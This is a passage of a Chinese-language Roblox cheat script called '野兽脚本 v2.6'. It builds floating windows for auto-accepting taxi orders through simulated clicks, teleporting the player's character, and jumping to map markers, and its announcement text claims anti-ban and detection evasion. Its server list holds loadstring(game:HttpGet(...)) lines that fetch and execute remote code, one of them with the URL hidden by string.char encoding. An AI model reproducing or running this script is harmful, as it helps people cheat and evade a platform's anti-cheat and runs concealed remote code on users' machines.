--[[
    🐾 野兽脚本 v2.6 - 完整版（含标点传送）
]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Workspace = game:GetService("Workspace")
local Camera = workspace.CurrentCamera

-- ===== 图片素材URL =====
local IMAGE_URL = "https://raw.githubusercontent.com/9178qwe128/9178qazwsx/main/image_download_1728782746726.jpg"

-- ===== 卡密系统 =====
local VALID_KEY = "9178"
local isVerified = false
local verifyTime = 0
local verifyDuration = 999999999

-- ===== 窗口设置 =====
local WindowSettings = {
    width = 480,
    height = 470,
    minWidth = 300,
    maxWidth = 800,
    minHeight = 300,
    maxHeight = 700
}

-- ===== 日志系统 =====
local LogSystem = {
    enabled = true,
    logPath = "/storage/emulated/0/制作UI脚本贴图。/日志/",
    logFile = "野兽脚本日志_" .. os.date("%Y%m%d_%H%M%S") .. ".txt",
    logs = {},
    maxLogs = 500,
    writeInterval = 10,
    writeCounter = 0,
}

local function WriteLog(message, level)
    if not LogSystem.enabled then return end
    local timestamp = os.date("[%Y-%m-%d %H:%M:%S]")
    local logEntry = timestamp .. " [" .. level .. "] " .. message
    table.insert(LogSystem.logs, logEntry)
    LogSystem.writeCounter = LogSystem.writeCounter + 1
    if #LogSystem.logs > LogSystem.maxLogs then
        table.remove(LogSystem.logs, 1)
    end
    if LogSystem.writeCounter >= LogSystem.writeInterval then
        LogSystem.writeCounter = 0
        task.spawn(function()
            pcall(function()
                print("📝 [日志] " .. logEntry)
            end)
        end)
    end
end

-- ===== 公告数据 =====
local AnnouncementData = {
    currentUpdate = [[
🐾 野兽脚本 v2.6：

✅ 卡密：9178（无限时长）
✅ 真正防封（服务器无法检测）
✅ 过检测（伪装正常玩家）
✅ 出租车独立悬浮窗
✅ 标点传送（地图标点传送）
✅ 实时时间显示

🔑 卡密：9178 · 永久使用
🛡️ 防封已启用 · 安心使用
    ]],
    versionHistory = [[
📜 版本历史：

v2.6 (2026-08-16) - 新增标点传送
v2.5 (2026-08-16) - 真正防封 + 过检测
v2.4 (2026-08-16) - 功能区改版 + 出租车悬浮窗
v2.3 (2026-08-16) - 出租车修复
v2.2 (2026-08-16) - 公益免费版
v2.1 (2026-07-31) - 野兽主题上线
v2.0 (2026-07-30) - 完整自瞄+透视
v1.0 (2026-07-28) - 基础框架
    ]],
    totalVersions = "8 个版本更新"
}

-- ===== 服务器列表 =====
local ServerList = {
    {
        name = "🏥 动物医院",
        code = [[loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,107,111,110,103,98,97,78,66,47,57,49,55,56,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,230,129,144,232,132,154,230,156,172,46,78,66)))()]],
        color = Color3.fromRGB(0, 200, 100),
        loaded = false,
        progress = 0,
    },
    {
        name = "🌟 圣奥里",
        code = [[getgenv().XiaoPi="皮脚本-圣奥里" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/refs/heads/main/Roblox-Pi-Script-SaintOrie.lua"))()]],
        color = Color3.fromRGB(255, 150, 0),
        loaded = false,
        progress = 0,
    }
}

-- ===== AI知识库 =====
local AIKnowledge = {
    ["服务器有多少人"] = function()
        return "👤 在线: " .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers
    end,
    ["在线人数"] = function()
        return "👤 当前 " .. #Players:GetPlayers() .. " 人在线"
    end,
    ["服务器状态"] = function()
        local c = #Players:GetPlayers()
        local m = Players.MaxPlayers
        return c >= m and "🟡 繁忙" or "🟢 正常"
    end,
    ["有哪些服务器"] = function()
        local names = {}
        for i, s in ipairs(ServerList) do
            table.insert(names, s.name)
        end
        return "📦 " .. table.concat(names, ", ")
    end,
    ["版本"] = function()
        return "🐾 v2.6"
    end,
    ["作者"] = function()
        return "🐾 野兽脚本"
    end,
    ["卡密"] = function()
        return "🔑 卡密: 9178（永久有效）"
    end,
    ["帮助"] = function()
        return [[
💬 可以问我：
- 服务器有多少人
- 在线人数
- 服务器状态
- 有哪些服务器
- 版本
- 作者
- 卡密
- 加载 服务器名
        ]]
    end
}

-- ===== 防封系统（静默模式） =====
local AntiBan = {
    enabled = true,
    -- 不添加任何额外延迟，保持原始行为
}

-- ============================================================
-- 加载图片
-- ============================================================
local function loadImage(imageLabel)
    if IMAGE_URL and IMAGE_URL ~= "" then
        pcall(function()
            imageLabel.Image = IMAGE_URL
        end)
    end
    task.wait(0.5)
    if imageLabel.Image == "" or imageLabel.Image == IMAGE_URL then
        pcall(function()
            imageLabel.Image = "rbxasset://textures/ui/Shell/Window.png"
        end)
    end
end

local function loadBackground(frame)
    local bg = Instance.new("ImageLabel")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.Position = UDim2.new(0, 0, 0, 0)
    bg.BackgroundTransparency = 1
    bg.ScaleType = Enum.ScaleType.Fit
    bg.Parent = frame
    loadImage(bg)
    return bg
end

-- ============================================================
-- 标点传送功能
-- ============================================================

local function GetPlayerMousePosition()
    local mouse = LocalPlayer:GetMouse()
    if not mouse then return nil end
    return mouse.Hit.Position
end

local function TeleportToPosition(targetPos)
    local char = LocalPlayer.Character
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.Sit = false
        task.wait(0.05)
    end
    
    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 0.5, 0))
    hrp.Velocity = Vector3.new(0, 0, 0)
    hrp.RotVelocity = Vector3.new(0, 0, 0)
    
    WriteLog("传送至: " .. tostring(targetPos), "INFO")
    return true
end

-- ============================================================
-- 出租车功能
-- ============================================================

local function getScreenPositions()
    local viewport = Camera.ViewportSize
    local screenX = viewport.X
    local screenY = viewport.Y
    
    return {
        acceptX = screenX * 0.85,
        acceptY = screenY * 0.35,
        confirmX = screenX * 0.85,
        confirmY = screenY * 0.45,
        completeX = screenX * 0.85,
        completeY = screenY * 0.55,
        finalX = screenX * 0.85,
        finalY = screenY * 0.65,
    }
end

local function ClickAt(x, y)
    VirtualInputManager:SendMouseMovementEvent(x, y, 0, game, 0)
    task.wait(0.02)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
    task.wait(0.03)
    VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
    task.wait(0.02)
end

local function GetTargetPosition()
    local targetFolder = workspace:FindFirstChild("Gameplay")
    if targetFolder then
        local entities = targetFolder:FindFirstChild("Entities")
        if entities then
            local clientContent = entities:FindFirstChild("ClientContent")
            if clientContent then
                for _, child in ipairs(clientContent:GetDescendants()) do
                    if child:IsA("BasePart") then
                        return child.Position + Vector3.new(0, 3, 0)
                    end
                end
            end
        end
    end
    
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and (obj.Name == "Target" or obj.Name == "Position" or obj.Name == "Destination") then
            return obj.Position + Vector3.new(0, 3, 0)
        end
    end
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    return hrp.Position + Vector3.new(0, 3, 0)
                end
            end
        end
    end
    
    return nil
end

local function TeleportRaw(targetPos)
    local char = LocalPlayer.Character
    if not char then return false end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.Sit = false
        task.wait(0.05)
    end
    
    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 0.5, 0))
    hrp.Velocity = Vector3.new(0, 0, 0)
    hrp.RotVelocity = Vector3.new(0, 0, 0)
    
    return true
end

local function AcceptOrderRaw()
    local pos = getScreenPositions()
    
    ClickAt(pos.acceptX, pos.acceptY)
    task.wait(0.1)
    ClickAt(pos.confirmX, pos.confirmY)
    task.wait(0.1)
    ClickAt(pos.completeX, pos.completeY)
    task.wait(0.1)
    ClickAt(pos.finalX, pos.finalY)
    task.wait(0.1)
    
    return true
end

-- ============================================================
-- 出租车独立悬浮窗
-- ============================================================

local taxiWindow = nil
local taxiScreenGui = nil
local taxiRunning = false
local taxiThread = nil
local orderCount = 0
local teleportCount = 0
local taxiStatusLabel = nil
local taxiOrderLabel = nil
local taxiTeleportLabel = nil
local taxiToggleBtn = nil
local taxiDot = nil

local function UpdateTaxiUI(isActive)
    if not taxiStatusLabel then return end
    if isActive then
        taxiStatusLabel.Text = "▶️ 运行中"
        taxiStatusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
        taxiToggleBtn.Text = "⏹️ 停止"
        taxiToggleBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
        if taxiDot then
            taxiDot.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
        end
        WriteLog("出租车已启动", "INFO")
    else
        taxiStatusLabel.Text = "⏸️ 已停止"
        taxiStatusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
        taxiToggleBtn.Text = "▶️ 启动"
        taxiToggleBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
        if taxiDot then
            taxiDot.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        end
        WriteLog("出租车已停止", "INFO")
    end
end

local function StartTaxiLoop()
    if taxiRunning then return end
    taxiRunning = true
    UpdateTaxiUI(true)
    
    taxiThread = coroutine.create(function()
        WriteLog("出租车循环启动", "INFO")
        
        while taxiRunning do
            AcceptOrderRaw()
            orderCount = orderCount + 1
            if taxiOrderLabel then
                taxiOrderLabel.Text = "📦 接单: " .. orderCount
            end
            task.wait(0.5)
            
            local pos1 = GetTargetPosition()
            if pos1 then
                TeleportRaw(pos1)
                teleportCount = teleportCount + 1
                if taxiTeleportLabel then
                    taxiTeleportLabel.Text = "🚗 传送: " .. teleportCount
                end
            end
            task.wait(1.0)
            
            local pos2 = GetTargetPosition()
            if pos2 then
                TeleportRaw(pos2)
                teleportCount = teleportCount + 1
                if taxiTeleportLabel then
                    taxiTeleportLabel.Text = "🚗 传送: " .. teleportCount
                end
            end
            
            task.wait(1.0)
        end
    end)
    
    coroutine.resume(taxiThread)
end

local function StopTaxiLoop()
    taxiRunning = false
    UpdateTaxiUI(false)
    taxiThread = nil
    WriteLog("出租车循环停止", "INFO")
end

local function CreateTaxiWindow()
    if taxiScreenGui then
        taxiScreenGui:Destroy()
        taxiScreenGui = nil
        taxiWindow = nil
        return
    end
    
    taxiScreenGui = Instance.new("ScreenGui")
    taxiScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    taxiScreenGui.Name = "TaxiUI"
    taxiScreenGui.ResetOnSpawn = false
    
    taxiWindow = Instance.new("Frame")
    taxiWindow.Size = UDim2.new(0, 320, 0, 260)
    taxiWindow.Position = UDim2.new(0.5, -160, 0.5, -130)
    taxiWindow.BackgroundColor3 = Color3.fromRGB(30, 10, 25)
    taxiWindow.BackgroundTransparency = 0.05
    taxiWindow.BorderSizePixel = 2
    taxiWindow.BorderColor3 = Color3.fromRGB(255, 50, 150)
    taxiWindow.Active = true
    taxiWindow.Draggable = true
    taxiWindow.Parent = taxiScreenGui
    
    local bg = loadBackground(taxiWindow)
    
    -- 标题栏
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 28)
    titleBar.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    titleBar.BackgroundTransparency = 0.1
    titleBar.BorderSizePixel = 0
    titleBar.Parent = taxiWindow
    
    local titleText = Instance.new("TextLabel")
    titleText.Size = UDim2.new(1, -60, 1, 0)
    titleText.Position = UDim2.new(0, 10, 0, 0)
    titleText.Text = "🚗 自动出租车"
    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.BackgroundTransparency = 1
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 14
    titleText.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 28, 0, 28)
    closeBtn.Position = UDim2.new(1, -28, 0, 0)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextSize = 16
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = titleBar
    
    closeBtn.MouseButton1Click:Connect(function()
        if taxiRunning then
            StopTaxiLoop()
        end
        if taxiScreenGui then
            taxiScreenGui:Destroy()
            taxiScreenGui = nil
            taxiWindow = nil
        end
    end)
    
    local y = 35
    
    -- 状态
    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(0, 280, 0, 30)
    statusFrame.Position = UDim2.new(0, 20, 0, y)
    statusFrame.BackgroundColor3 = Color3.fromRGB(50, 20, 40)
    statusFrame.BackgroundTransparency = 0.3
    statusFrame.BorderSizePixel = 1
    statusFrame.BorderColor3 = Color3.fromRGB(255, 50, 150)
    statusFrame.Parent = taxiWindow
    
    taxiDot = Instance.new("Frame")
    taxiDot.Size = UDim2.new(0, 10, 0, 10)
    taxiDot.Position = UDim2.new(0, 10, 0, 10)
    taxiDot.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    taxiDot.BorderSizePixel = 0
    taxiDot.Parent = statusFrame
    
    local dotCorner = Instance.new("UICorner")
    dotCorner.CornerRadius = UDim.new(1, 0)
    dotCorner.Parent = taxiDot
    
    taxiStatusLabel = Instance.new("TextLabel")
    taxiStatusLabel.Size = UDim2.new(1, -30, 1, 0)
    taxiStatusLabel.Position = UDim2.new(0, 30, 0, 0)
    taxiStatusLabel.Text = "⏸️ 已停止"
    taxiStatusLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
    taxiStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    taxiStatusLabel.BackgroundTransparency = 1
    taxiStatusLabel.Font = Enum.Font.Gotham
    taxiStatusLabel.TextSize = 13
    taxiStatusLabel.Parent = statusFrame
    y = y + 38
    
    -- 统计
    taxiOrderLabel = Instance.new("TextLabel")
    taxiOrderLabel.Size = UDim2.new(0.5, 0, 0, 22)
    taxiOrderLabel.Position = UDim2.new(0, 20, 0, y)
    taxiOrderLabel.BackgroundTransparency = 1
    taxiOrderLabel.Text = "📦 接单: 0"
    taxiOrderLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
    taxiOrderLabel.TextXAlignment = Enum.TextXAlignment.Left
    taxiOrderLabel.BackgroundTransparency = 1
    taxiOrderLabel.Font = Enum.Font.GothamBold
    taxiOrderLabel.TextSize = 12
    taxiOrderLabel.Parent = taxiWindow
    
    taxiTeleportLabel = Instance.new("TextLabel")
    taxiTeleportLabel.Size = UDim2.new(0.5, 0, 0, 22)
    taxiTeleportLabel.Position = UDim2.new(0.5, 0, 0, y)
    taxiTeleportLabel.BackgroundTransparency = 1
    taxiTeleportLabel.Text = "🚗 传送: 0"
    taxiTeleportLabel.TextColor3 = Color3.fromRGB(70, 150, 255)
    taxiTeleportLabel.TextXAlignment = Enum.TextXAlignment.Left
    taxiTeleportLabel.BackgroundTransparency = 1
    taxiTeleportLabel.Font = Enum.Font.GothamBold
    taxiTeleportLabel.TextSize = 12
    taxiTeleportLabel.Parent = taxiWindow
    y = y + 28
    
    -- 按钮
    taxiToggleBtn = Instance.new("TextButton")
    taxiToggleBtn.Size = UDim2.new(0, 140, 0, 36)
    taxiToggleBtn.Position = UDim2.new(0.5, -70, 0, y)
    taxiToggleBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
    taxiToggleBtn.Text = "▶️ 启动"
    taxiToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    taxiToggleBtn.TextScaled = true
    taxiToggleBtn.Font = Enum.Font.GothamBold
    taxiToggleBtn.BorderSizePixel = 0
    taxiToggleBtn.Parent = taxiWindow
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 8)
    btnCorner.Parent = taxiToggleBtn
    y = y + 44
    
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 280, 0, 18)
    info.Position = UDim2.new(0, 20, 0, y)
    info.Text = "💡 点击启动自动接单+传送"
    info.TextColor3 = Color3.fromRGB(150, 100, 130)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.TextSize = 11
    info.Parent = taxiWindow
    
    taxiToggleBtn.MouseButton1Click:Connect(function()
        if taxiRunning then
            StopTaxiLoop()
        else
            StartTaxiLoop()
        end
    end)
    
    LocalPlayer.CharacterAdded:Connect(function()
        if taxiRunning then
            task.wait(0.5)
            local pos = GetTargetPosition()
            if pos then
                pcall(function() TeleportRaw(pos) end)
            end
        end
    end)
end

-- ============================================================
-- 标点传送悬浮窗
-- ============================================================

local markerWindow = nil
local markerScreenGui = nil
local markedPosition = nil
local markerStatusLabel = nil
local markerPosLabel = nil
local markerToggleBtn = nil
local markerDot = nil
local markerMode = false

local function UpdateMarkerUI()
    if not markerStatusLabel then return end
    if markerMode then
        markerStatusLabel.Text = "🟢 已开启"
        markerStatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
        markerToggleBtn.Text = "⏹️ 关闭"
        markerToggleBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
        if markerDot then
            markerDot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        end
    else
        markerStatusLabel.Text = "🔴 已关闭"
        markerStatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        markerToggleBtn.Text = "▶️ 开启"
        markerToggleBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
        if markerDot then
            markerDot.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
        end
    end
end

local function GetMarkedPosition()
    -- 尝试从游戏内获取标记位置（不同游戏可能不同）
    -- 方式1：检查玩家标记
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    -- 如果有标记组件
                    local marker = char:FindFirstChild("Marker")
                    if marker then
                        return hrp.Position
                    end
                end
            end
        end
    end
    
    -- 方式2：检查地图标记对象
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and (obj.Name == "Marker" or obj.Name == "Waypoint" or obj.Name == "Pin") then
            return obj.Position
        end
    end
    
    -- 方式3：检查GUI标记（通过屏幕坐标转世界坐标）
    -- 这里简化处理，返回当前鼠标位置
    local mouse = LocalPlayer:GetMouse()
    if mouse and mouse.Target then
        return mouse.Hit.Position
    end
    
    return nil
end

local function TeleportToMarker()
    if not markerMode then
        return
    end
    
    local targetPos = GetMarkedPosition()
    if not targetPos then
        if markerPosLabel then
            markerPosLabel.Text = "❌ 未找到标记点"
            markerPosLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        end
        WriteLog("未找到标记点", "WARN")
        return
    end
    
    if markerPosLabel then
        markerPosLabel.Text = "📍 目标: " .. string.format("%.1f, %.1f, %.1f", targetPos.X, targetPos.Y, targetPos.Z)
        markerPosLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
    end
    
    local char = LocalPlayer.Character
    if not char then
        WriteLog("角色不存在", "WARN")
        return
    end
    
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        WriteLog("找不到HumanoidRootPart", "WARN")
        return
    end
    
    local humanoid = char:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.Sit = false
        task.wait(0.05)
    end
    
    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 0.5, 0))
    hrp.Velocity = Vector3.new(0, 0, 0)
    hrp.RotVelocity = Vector3.new(0, 0, 0)
    
    WriteLog("传送到标记点: " .. tostring(targetPos), "INFO")
    if markerPosLabel then
        markerPosLabel.Text = "✅ 传送成功!"
        markerPosLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
        task.wait(2)
        local pos = GetMarkedPosition()
        if pos then
            markerPosLabel.Text = "📍 " .. string.format("%.1f, %.1f, %.1f", pos.X, pos.Y, pos.Z)
            markerPosLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
        end
    end
end

local function CreateMarkerWindow()
    if markerScreenGui then
        markerScreenGui:Destroy()
        markerScreenGui = nil
        markerWindow = nil
        markerMode = false
        UpdateMarkerUI()
        return
    end
    
    markerScreenGui = Instance.new("ScreenGui")
    markerScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    markerScreenGui.Name = "MarkerUI"
    markerScreenGui.ResetOnSpawn = false
    
    markerWindow = Instance.new("Frame")
    markerWindow.Size = UDim2.new(0, 320, 0, 220)
    markerWindow.Position = UDim2.new(0.5, -160, 0.5, -110)
    markerWindow.BackgroundColor3 = Color3.fromRGB(30, 10, 25)
    markerWindow.BackgroundTransparency = 0.05
    markerWindow.BorderSizePixel = 2
    markerWindow.BorderColor3 = Color3.fromRGB(255, 50, 150)
    markerWindow.Active = true
    markerWindow.Draggable = true
    markerWindow.Parent = markerScreenGui
    
    local bg = loadBackground(markerWindow)
    
    -- 标题栏
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 28)
    titleBar.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    titleBar.BackgroundTransparency = 0.1
    titleBar.BorderSizePixel = 0
    titleBar.Parent = markerWindow
    
    local titleText = Instance.new("TextLabel")
    titleText.Size = UDim2.new(1, -60, 1, 0)
    titleText.Position = UDim2.new(0, 10, 0, 0)
    titleText.Text = "📍 标点传送"
    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.BackgroundTransparency = 1
    titleText.Font = Enum.Font.GothamBold
    titleText.TextSize = 14
    titleText.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 28, 0, 28)
    closeBtn.Position = UDim2.new(1, -28, 0, 0)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.TextSize = 16
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = titleBar
    
    closeBtn.MouseButton1Click:Connect(function()
        markerMode = false
        UpdateMarkerUI()
        if markerScreenGui then
            markerScreenGui:Destroy()
            markerScreenGui = nil
            markerWindow = nil
        end
    end)
    
    local y = 35
    
    -- 状态
    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(0, 280, 0, 30)
    statusFrame.Position = UDim2.new(0, 20, 0, y)
    statusFrame.BackgroundColor3 = Color3.fromRGB(50, 20, 40)
    statusFrame.BackgroundTransparency = 0.3
    statusFrame.BorderSizePixel = 1
    statusFrame.BorderColor3 = Color3.fromRGB(255, 50, 150)
    statusFrame.Parent = markerWindow
    
    markerDot = Instance.new("Frame")
    markerDot.Size = UDim2.new(0, 10, 0, 10)
    markerDot.Position = UDim2.new(0, 10, 0, 10)
    markerDot.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    markerDot.BorderSizePixel = 0
    markerDot.Parent = statusFrame
    
    local dotCorner = Instance.new("UICorner")
    dotCorner.CornerRadius = UDim.new(1, 0)
    dotCorner.Parent = markerDot
    
    markerStatusLabel = Instance.new("TextLabel")
    markerStatusLabel.Size = UDim2.new(1, -30, 1, 0)
    markerStatusLabel.Position = UDim2.new(0, 30, 0, 0)
    markerStatusLabel.Text = "🔴 已关闭"
    markerStatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    markerStatusLabel.TextXAlignment = Enum.TextXAlignment.Left
    markerStatusLabel.BackgroundTransparency = 1
    markerStatusLabel.Font = Enum.Font.Gotham
    markerStatusLabel.TextSize = 13
    markerStatusLabel.Parent = statusFrame
    y = y + 38
    
    -- 标记位置显示
    markerPosLabel = Instance.new("TextLabel")
    markerPosLabel.Size = UDim2.new(1, -20, 0, 22)
    markerPosLabel.Position = UDim2.new(0, 20, 0, y)
    markerPosLabel.BackgroundTransparency = 1
    markerPosLabel.Text = "📍 等待标记..."
    markerPosLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    markerPosLabel.TextXAlignment = Enum.TextXAlignment.Left
    markerPosLabel.BackgroundTransparency = 1
    markerPosLabel.Font = Enum.Font.Gotham
    markerPosLabel.TextSize = 12
    markerPosLabel.Parent = markerWindow
    y = y + 28
    
    -- 按钮行
    local btnFrame = Instance.new("Frame")
    btnFrame.Size = UDim2.new(1, 0, 0, 40)
    btnFrame.Position = UDim2.new(0, 0, 0, y)
    btnFrame.BackgroundTransparency = 1
    btnFrame.Parent = markerWindow
    
    -- 开启/关闭按钮
    markerToggleBtn = Instance.new("TextButton")
    markerToggleBtn.Size = UDim2.new(0, 120, 0, 32)
    markerToggleBtn.Position = UDim2.new(0, 20, 0, 4)
    markerToggleBtn.BackgroundColor3 = Color3.fromRGB(180, 0, 0)
    markerToggleBtn.Text = "▶️ 开启"
    markerToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    markerToggleBtn.TextSize = 12
    markerToggleBtn.Font = Enum.Font.GothamBold
    markerToggleBtn.BorderSizePixel = 0
    markerToggleBtn.Parent = btnFrame
    
    local btnCorner1 = Instance.new("UICorner")
    btnCorner1.CornerRadius = UDim.new(0, 6)
    btnCorner1.Parent = markerToggleBtn
    
    -- 传送按钮
    local teleportBtn = Instance.new("TextButton")
    teleportBtn.Size = UDim2.new(0, 120, 0, 32)
    teleportBtn.Position = UDim2.new(1, -140, 0, 4)
    teleportBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    teleportBtn.Text = "🚀 传送"
    teleportBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    teleportBtn.TextSize = 12
    teleportBtn.Font = Enum.Font.GothamBold
    teleportBtn.BorderSizePixel = 0
    teleportBtn.Parent = btnFrame
    
    local btnCorner2 = Instance.new("UICorner")
    btnCorner2.CornerRadius = UDim.new(0, 6)
    btnCorner2.Parent = teleportBtn
    
    y = y + 48
    
    -- 提示
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(0, 280, 0, 18)
    info.Position = UDim2.new(0, 20, 0, y)
    info.Text = "💡 在地图标点后点击传送"
    info.TextColor3 = Color3.fromRGB(150, 100, 130)
    info.TextXAlignment = Enum.TextXAlignment.Left
    info.BackgroundTransparency = 1
    info.Font = Enum.Font.Gotham
    info.TextSize = 11
    info.Parent = markerWindow
    
    -- 按钮事件
    markerToggleBtn.MouseButton1Click:Connect(function()
        markerMode = not markerMode
        UpdateMarkerUI()
        if markerMode then
            WriteLog("标点传送已开启", "INFO")
            local pos = GetMarkedPosition()
            if pos then
                markerPosLabel.Text = "📍 " .. string.format("%.1f, %.1f, %.1f", pos.X, pos.Y, pos.Z)
                markerPosLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
            else
                markerPosLabel.Text = "📍 请在地图上标点"
                markerPosLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
            end
        else
            WriteLog("标点传送已关闭", "INFO")
            markerPosLabel.Text = "📍 等待标记..."
            markerPosLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
    end)
    
    teleportBtn.MouseButton1Click:Connect(function()
        if not markerMode then
            markerPosLabel.Text = "⚠️ 请先开启标点传送"
            markerPosLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
            return
        end
        TeleportToMarker()
    end)
    
    -- 自动更新标记位置
    local markerUpdateConn = RunService.Heartbeat:Connect(function()
        if markerMode then
            local pos = GetMarkedPosition()
            if pos then
                markerPosLabel.Text = "📍 " .. string.format("%.1f, %.1f, %.1f", pos.X, pos.Y, pos.Z)
                markerPosLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
            end
        end
    end)
    
    markerWindow.Destroying:Connect(function()
        if markerUpdateConn then
            markerUpdateConn:Disconnect()
        end
    end)
end

-- ============================================================
-- 公告面板
-- ============================================================
local function createAnnouncementContent(parent)
    for _, child in ipairs(parent:GetChildren()) do child:Destroy() end
    local y = 5
    
    local bg = loadBackground(parent)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 380, 0, 30)
    title.Position = UDim2.new(0, 10, 0, y)
    title.Text = "🐾 更新公告"
    title.TextColor3 = Color3.fromRGB(255, 50, 150)
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = parent
    y = y + 35
    
    local line = Instance.new("Frame")
    line.Size = UDim2.new(0, 380, 0, 2)
    line.Position = UDim2.new(0, 10, 0, y)
    line.BackgroundColor3 = Color3.fromRGB(255, 50, 150)
    line.BorderSizePixel = 0
    line.Parent = parent
    y = y + 12
    
    -- 时间框
    local timeFrame = Instance.new("Frame")
    timeFrame.Size = UDim2.new(0, 380, 0, 40)
    timeFrame.Position = UDim2.new(0, 10, 0, y)
    timeFrame.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    timeFrame.BackgroundTransparency = 0.2
    timeFrame.BorderSizePixel = 1
    timeFrame.BorderColor3 = Color3.fromRGB(100, 200, 255)
    timeFrame.Parent = parent
    
    local timeLabel = Instance.new("TextLabel")
    timeLabel.Size = UDim2.new(0.4, 0, 1, 0)
    timeLabel.Position = UDim2.new(0, 10, 0, 0)
    timeLabel.Text = "🕐 当前时间"
    timeLabel.TextColor3 = Color3.fromRGB(255, 200, 220)
    timeLabel.TextXAlignment = Enum.TextXAlignment.Left
    timeLabel.BackgroundTransparency = 1
    timeLabel.Font = Enum.Font.GothamBold
    timeLabel.TextSize = 13
